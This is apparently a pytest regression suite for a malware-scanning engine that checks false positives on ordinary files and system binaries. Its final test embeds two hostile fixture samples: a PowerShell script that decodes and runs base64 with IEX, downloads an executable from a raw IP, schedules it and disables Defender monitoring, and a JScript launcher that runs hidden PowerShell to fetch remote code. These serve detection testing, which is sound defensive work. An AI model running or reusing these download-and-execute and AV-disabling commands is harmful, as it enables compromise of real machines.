"""False-positive regression guard.

An audit measured a 90% false-positive rate on a corpus of ordinary business
files: Microsoft-signed system binaries were reported as
"Win32.Downloader.TimestampAnomaly", every PDF became an "Exploit" because the
capability matcher found "rop" inside *ent-rop-y*, and a password-protected
Word document was classified as ransomware because "encrypt" matched
``office.encrypted``.

False positives are the defect that loses an enterprise customer — an analyst
who is paged for notepad.exe stops trusting every other verdict. These tests
pin the specific mistakes so they cannot come back, and assert a ceiling on the
overall rate.
"""
from __future__ import annotations

import glob
import io
import os
import zipfile

import pytest

from app.engine import capabilities, impact, pipeline, storage, verdict
from app.engine.contracts import AnalyzerResult, IOCs, Signal


# --- the exact matcher bugs that caused the 90% ------------------------------

def test_entropy_is_not_an_exploit():
    """'rop' must not match inside 'entropy'. Every packed installer regressed on this."""
    caps = capabilities.detect([
        Signal(id="pe.high_entropy_section", title="Section .text has high entropy", severity="medium"),
        Signal(id="generic.high_entropy_overall", title="Overall entropy is high", severity="medium"),
    ])
    assert "exploit" not in caps


def test_password_protected_document_is_not_ransomware():
    """'encrypt' must not match 'office.encrypted' — that is a protected file, not a wiper."""
    caps = capabilities.detect([
        Signal(id="office.encrypted", title="The document is encrypted", severity="medium"),
        Signal(id="pdf.encrypted", title="The PDF is encrypted", severity="medium"),
    ])
    assert "destruction" not in caps


def test_info_signals_never_assert_capability():
    """A signed binary is evidence of good, not of capability."""
    caps = capabilities.detect([
        Signal(id="pe.signature_present", title="An Authenticode signature is present", severity="info"),
        Signal(id="pe.timestamp_anomaly", title="Compile timestamp is in the future", severity="info"),
    ])
    assert caps == set()


def test_indicators_alone_do_not_make_a_downloader():
    """A README with a link has not communicated with anything."""
    caps = capabilities.detect([], IOCs(urls=["https://example.com/docs"]))
    assert "network" not in caps


def test_impact_is_zero_without_capability():
    """The rating scores an impact; no demonstrated capability means no impact."""
    result = impact.assess("pe", [Signal(id="pe.signature_present", title="Signed", severity="info")])
    assert result.base_score == 0.0
    assert result.severity == "none"


def test_verdict_never_contradicts_the_score():
    """malicious + 'X.Clean' + score 1.8 in one payload destroys analyst trust."""
    result = AnalyzerResult(analyzer="generic", signals=[], iocs=IOCs(urls=["https://example.com"]))
    v = verdict.classify("script", "text/plain", [result], IOCs(urls=["https://example.com"]), 1.8)
    assert v.verdict == "clean"
    assert v.threat_name.endswith(".Clean")


def test_unnamed_anomalies_are_suspicious_not_malicious():
    """If no capability was demonstrated we cannot name a threat, so we do not claim one."""
    noisy = AnalyzerResult(
        analyzer="pe",
        signals=[Signal(id="pe.overlay_present", title="Overlay", severity="medium") for _ in range(6)],
    )
    v = verdict.classify("pe", "application/x-dosexec", [noisy], IOCs(), 65.0)
    assert v.verdict != "malicious"


# --- corpus-level ceiling ----------------------------------------------------

def _benign_corpus() -> list[tuple[str, bytes]]:
    corpus: list[tuple[str, bytes]] = [
        ("readme.md", b"# Project\n\nDocs: https://example.com/docs\n"),
        ("notes.txt", b"Meeting notes\n- renew certificate\n"),
        ("config.json", b'{"api_url": "https://api.example.com", "timeout": 30}\n'),
        ("data.csv", b"name,email\nAli,ali@example.com\n"),
        ("styles.css", b"body { margin: 0; font-family: system-ui; }\n"),
        ("index.html", b"<!doctype html><html><body><a href='https://x.test'>H</a></body></html>\n"),
        ("script.py", b"import json\n\ndef load(p):\n    return json.load(open(p))\n"),
        ("build.sh", b"#!/bin/sh\nset -e\nnpm ci\n"),
    ]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("report.txt", b"Quarterly report\n")
        zf.writestr("data.csv", b"a,b\n1,2\n")
    corpus.append(("archive.zip", buf.getvalue()))

    # Real signed system binaries, when the platform has them.
    for path in (
        r"C:\Windows\System32\notepad.exe", r"C:\Windows\System32\calc.exe",
        r"C:\Windows\System32\where.exe", r"C:\Windows\System32\hostname.exe",
        r"C:\Windows\System32\kernel32.dll", r"C:\Windows\System32\shell32.dll",
        r"C:\Windows\System32\user32.dll", r"C:\Windows\System32\advapi32.dll",
    ):
        try:
            with open(path, "rb") as fh:
                data = fh.read()
            if 0 < len(data) < 20_000_000:
                corpus.append((os.path.basename(path), data))
        except OSError:
            pass

    # Whatever ordinary documents this machine happens to have.
    for pattern in (r"C:\Windows\Web\Wallpaper\**\*.jpg",):
        for path in glob.glob(pattern, recursive=True)[:3]:
            try:
                with open(path, "rb") as fh:
                    corpus.append((os.path.basename(path), fh.read()))
            except OSError:
                pass
    return corpus


def test_benign_corpus_produces_no_malicious_verdict(db):
    corpus = _benign_corpus()
    assert len(corpus) >= 9, "corpus too small to be meaningful"

    offenders: list[str] = []
    high_impact: list[str] = []
    for name, data in corpus:
        stored = storage.store_bytes(data)
        job = pipeline.new_job(db, stored, original_name=name, tenant="default")
        db.commit()
        pipeline.run(db, job)
        db.commit()
        if (job.verdict or {}).get("verdict") == "malicious":
            offenders.append(f"{name} -> {(job.verdict or {}).get('threat_name')} score={job.final_score}")
        if (job.impact or {}).get("base_score", 0) >= 7.0:
            high_impact.append(f"{name} -> impact {(job.impact or {}).get('base_score')}")

    assert not offenders, "benign files reported malicious:\n  " + "\n  ".join(offenders)
    assert not high_impact, "benign files rated impact >= 7.0:\n  " + "\n  ".join(high_impact)


@pytest.mark.parametrize(
    "name,payload",
    [
        (
            "invoice.ps1",
            b"$b='SQBFAFgA'\n"
            b"IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)))\n"
            b"(New-Object Net.WebClient).DownloadFile('http://185.220.101.5/p.exe','p.exe')\n"
            b"schtasks /create /sc minute /tn U /tr p.exe /f\n"
            b"Set-MpPreference -DisableRealtimeMonitoring $true\n",
        ),
        (
            "launcher.js",
            b'var s=new ActiveXObject("WScript.Shell");\n'
            b'eval(unescape("%70%6f%77%65%72"));\n'
            b"s.Run(\"powershell -nop -w hidden -c IEX(New-Object Net.WebClient)"
            b".DownloadString('http://45.9.148.99/a')\");\n",
        ),
    ],
)
def test_real_threats_are_still_caught(db, name, payload):
    """The cure for false positives must not be detecting nothing."""
    stored = storage.store_bytes(payload)
    job = pipeline.new_job(db, stored, original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()

    assert (job.verdict or {}).get("verdict") == "malicious", (
        f"{name} was not caught: {job.verdict} score={job.final_score}"
    )
    assert job.final_score >= 60
    assert (job.impact or {}).get("base_score", 0) > 0
    assert job.mitre, "no ATT&CK techniques mapped"
